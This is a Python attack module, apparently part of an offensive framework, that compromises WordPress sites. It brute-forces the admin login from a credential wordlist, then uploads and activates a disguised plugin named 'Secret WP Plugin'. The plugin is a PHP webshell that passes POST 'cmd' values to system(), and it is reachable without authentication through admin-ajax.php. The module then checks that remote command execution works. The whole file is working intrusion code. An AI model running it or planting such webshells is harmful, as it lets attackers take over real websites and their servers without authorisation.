'''
name : WordPress Evil Plugin Upload Attack Module
description : This module attempts to upload a malicious plugin to a WordPress site to gain remote code execution.
version : 1.1
author : Ayato
'''

import requests
import json
import os
import bs4
import time

webshell = """
<?php
/**
 * Plugin Name: Secret WP Plugin
 * Plugin URI: https://example.com/
 * Description: Make your WordPress secret
 * Version: 3.1.18
 * Author: secret inc ltd
 * Author URI: https://example.com/
 */

if (!defined('ABSPATH')) {
    exit;
}

add_action('wp_ajax_secret_wp_plugin', 'secrets');
add_action('wp_ajax_nopriv_secret_wp_plugin', 'secrets');

function secrets() {
    if (isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
    wp_die();
}
"""

def create_plugin(workdir, folder, file):
    print("[*] Creating evil WordPress plugin...")
    try:
        zip_path = f"{workdir}/{folder}.zip"
        php_path = f"{workdir}/{folder}/{file}.php"
        work_folder = f"{workdir}/{folder}"
        os.system(f"rm -rf {work_folder}")
        os.system(f"mkdir {work_folder}")
        os.system(f"touch {php_path}")
        with open(php_path, "w") as f:
            f.write(webshell)
        os.system(f"cd {workdir} && zip -q -r {file}.zip {folder}")
        print(f"[*] Created evil plugin at {zip_path}")
        return zip_path
    except Exception as e:
        print(f"[-] Error creating plugin: {e}")
        return None

def open_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            wordlist = json.load(f)
        return wordlist
    except FileNotFoundError:
        print(f"[-] Wordlist file {wordlist_path} not found.")
        return None

def try_generate_session(ip, username, password, user_agent):
    print(f"[*] Trying to generate session for {username} on {ip}")
    login_url = f"http://{ip}/wp-login.php"
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"http://{ip}/wp-admin/",
        "testcookie": "1"
    }
    try:
        session = requests.Session()
        res = requests.post(
            url=login_url,
            headers=headers,
            data=login_data,
            timeout=(6, 6)
        )
        if len(res.cookies.get_dict()) > 2:
            print(f"[+] Successfully generated session for {username} on {ip}")
            session = requests.Session()
            session.cookies.update(res.cookies)
            return session
        else:
            print(f"[-] Failed to generate session for {username} on {ip}")
            return None
    except Exception as e:
        print(f"[-] Error generating session for {username} on {ip}: {e}")
        return None

def get_nonce(ip, uri, session, user_agent):
    install_url = f"http://{ip}{uri}"
    print(f"[*] Fetching nonce from {install_url}")
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        res = session.get(
            url=install_url,
            headers=headers,
            timeout=(6, 6)
        )
        soup = bs4.BeautifulSoup(res.text, 'html.parser')
        form_wpnonce = soup.find('form', {'class': 'wp-upload-form'})
        input_nonce = form_wpnonce.find('input', {'id': '_wpnonce'})
        if input_nonce and 'value' in input_nonce.attrs:
            nonce = input_nonce['value']
            print(f"[+] Fetched nonce on {ip}: {nonce}")
            return nonce
        else:
            print(f"[-] Nonce not found on {install_url}")
            return None
    except Exception as e:
        print(f"[-] Error fetching nonce from {install_url}: {e}")
        return None

def upload_plugin(ip, session, plugin_path, user_agent):
    print(f"[*] Uploading evil plugin to http://{ip}/wp-admin/update.php?action=upload-plugin")
    nonce = get_nonce(ip, "/wp-admin/plugin-install.php", session, user_agent)
    if not nonce:
        print(f"[-] Could not retrieve nonce on {ip}, aborting upload.")
        return False
    upload_url = f"http://{ip}/wp-admin/update.php?action=upload-plugin"
    headers = {
        "User-Agent": f"{user_agent}",
        "Referer": f"http://{ip}/wp-admin/plugin-install.php",
    }
    files = {
        "_wpnonce": (None, nonce),
        "_wp_http_referer": (None, "/wp-admin/plugin-install.php"),
        "install-plugin-submit": (None, "今すぐインストール"),
        "pluginzip": (os.path.basename(plugin_path), open(plugin_path, "rb"), "application/zip"),
    }
    try:
        res = session.post(
            url=upload_url,
            headers=headers,
            files=files,
            timeout=60,
            allow_redirects=False
        )
        if "Plugin installed successfully." in res.text or "完了しました" in res.text:
            print("[+] Successfully uploaded evil plugin.")
            return True
        else:
            print(f"[-] Failed to upload evil plugin on {ip}.")
            return False
    except Exception as e:
        print(f"[-] Error uploading plugin on {ip}: {e}")
        return False

def activate_plugin(host, session, user_agent):
    print("[*] Getting activate url from plugin manager")
    url = f"http://{host}/wp-admin/plugins.php"
    headers = {
        "User-Agent": user_agent,
    }
    try:
        res = session.get(
            url=url,
            headers=headers,
            timeout=(6, 6)
        )
        soup = bs4.BeautifulSoup(res.text, 'html.parser')
        activate_link = soup.find('a', {'aria-label': 'Secret WP Plugin を有効化'})
        if activate_link and 'href' in activate_link.attrs:
            activate_url = f"http://{host}/wp-admin/{activate_link['href']}"
            print(f"[*] Got activate url: {activate_url}")
            res = session.get(
                url=activate_url,
                headers=headers,
                timeout=(6, 6),
                allow_redirects=False
            )
            print(f"[+] Activated evil plugin on {host}")
            return True
        else:
            print(f"[-] Activate link not found on {host}.")
            return False
    except Exception as e:
        print(f"[-] Error activating plugin on {host}: {e}")
        return False

# curl test command: curl -X POST -d "action=secret_wp_plugin&cmd=echo WP_Evil_Plugin_Test OK" http://<ip>/wp-admin/admin-ajax.php
def check_shell(ip):
    print(f"[*] Checking evil plugin webshell on {ip}")
    time.sleep(2)
    cmd = "echo WP_Evil_Plugin_Test OK"
    shell_url = f"http://{ip}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
        "action": "secret_wp_plugin",
        "cmd": cmd
    }
    try:
        res = requests.post(
            url=shell_url,
            headers=headers,
            data=data,
            timeout=(10, 10),
            allow_redirects=False
        )
        if res.status_code == 200 and "WP_Evil_Plugin_Test" in res.text:
            print(f"[+] Webshell is working on {ip}. Command output: {res.text.strip()}")
            return True
        else:
            print(f"[-] Webshell did not respond as expected on {ip}.")
            return False
    except Exception as e:
        print(f"[-] Error checking webshell on {ip}: {e}")
        return False

def check_active(ip, user_agent):
    print(f"[*] Checking if WordPress is active on {ip}")
    url = f"http://{ip}/"
    headers = {
        "User-Agent": f"{user_agent}",
    }
    try:
        res = requests.get(
            url=url,
            headers=headers,
            timeout=(10, 10),
            allow_redirects=False
        )
        if "wp-content" in res.text or "WordPress" in res.text:
            print(f"[+] WordPress is active on {ip}")
            return True
        else:
            print(f"[-] WordPress not detected on {ip}")
            return False
    except Exception as e:
        print(f"[-] Error checking WordPress on {ip}: {e}")
        return False

def run(ip, uri, user_agent, backdoor_credentials, workdir):
    print("[*] Running WordPress Evil Plugin Upload attack module...")
    print(f"[*] Target IP: {ip}")
    wordlist_data = open_wordlist(backdoor_credentials)
    if not wordlist_data:
        print(f"[-] No credentials data found on {ip}. Exiting.")
        return -1
    if not check_active(ip, user_agent):
        print(f"[-] WordPress not active on {ip}. Exiting.")
        return 0
    random_suffix = os.urandom(4).hex()
    plugin_path = create_plugin(workdir, f"secret_wp_plugin_{random_suffix}", f"secret_wp_plugin_{random_suffix}")
    if not plugin_path:
        print(f"[-] Failed to create evil plugin on {ip}. Exiting.")
        return -1
    for username in wordlist_data['usernames']:
        for password in wordlist_data['passwords']:
            session = try_generate_session(ip, username, password, user_agent)
            if session:
                upload_res = upload_plugin(ip, session, plugin_path, user_agent)
                if upload_res:
                    activate_res = activate_plugin(ip, session, user_agent)
                    if activate_res:
                        print(f"[+] Successfully uploaded and activated evil plugin on {ip} using {username}:{password}")
                        if check_shell(ip):
                            print(f"[+] Evil plugin webshell is functional on {ip}")
                            return 0
                        else:
                            print(f"[-] Evil plugin webshell is not functional on {ip}")
                            return -1
                else:
                    print(f"[-] Failed to upload evil plugin on {ip} using {username}:{password}")
            else:
                print(f"[-] Could not generate session for {username}:{password} on {ip}")
    print(f"[-] Exhausted all credentials without success on {ip}.")
    return -1